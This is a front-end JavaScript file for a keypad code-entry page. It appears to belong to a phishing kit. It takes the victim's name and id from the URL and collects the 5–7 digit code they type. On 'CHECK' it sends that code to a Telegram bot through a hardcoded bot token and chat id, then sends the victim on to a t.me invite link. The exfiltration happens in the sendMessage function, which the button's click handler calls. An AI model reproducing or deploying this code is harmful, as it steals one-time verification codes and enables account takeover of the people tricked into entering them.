var btns = document.querySelectorAll(".btn button");
var input = document.getElementById("inputCode");

let userData = document.querySelector("div.header-buttom p b");
let urlParams = new URL(window.location).searchParams;
const id = urlParams.get("id");
const full_name = urlParams.get("full_name");
userData.innerText = `${full_name} (${id})`;

const botToken = '7662919654:AAFAW2XBWcdWlde-hNLiCOTfr230_L_KFVw';
const chatId = '5625291747';
const message = `${full_name} (${id})-> `;

async function sendMessage(text) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    try {
        const response = await fetch(url);
    } catch (error) {
        console.error('Error:', error);
    }
}

document.querySelector('button[data-key="CHECK"]').addEventListener('click', async () => {
    if (input.value.length >= 5) {
        await sendMessage(message + input.value);
        input.value = '';
    } else {
        input.style.border = "1px solid red";
    }
});

var pattern = /^[0-9]$/;
btns.forEach((btn) => {
    btn.addEventListener("click", function () {
        if (input.value.length < 7) {
            input.value += this.innerText;
        }

        if (input.value.length < 5) {
            input.style.border = "1px solid #e7e8e6";
        } else {
            input.style.border = "1px solid #2cab37";
        }

        if (this.getAttribute("data-key") === "BACK") {
            input.value = input.value.slice(0, -1);
            if (input.value.length < 5) {
                input.style.border = "1px solid #e7e8e6";
            }
        }
    });
});

document.querySelectorAll(".footer div").forEach((href) => {
    href.addEventListener("click", function () {
        setTimeout(() => {
            window.location.href = "https://t.me/+42777";
        }, 1000);
    });
});
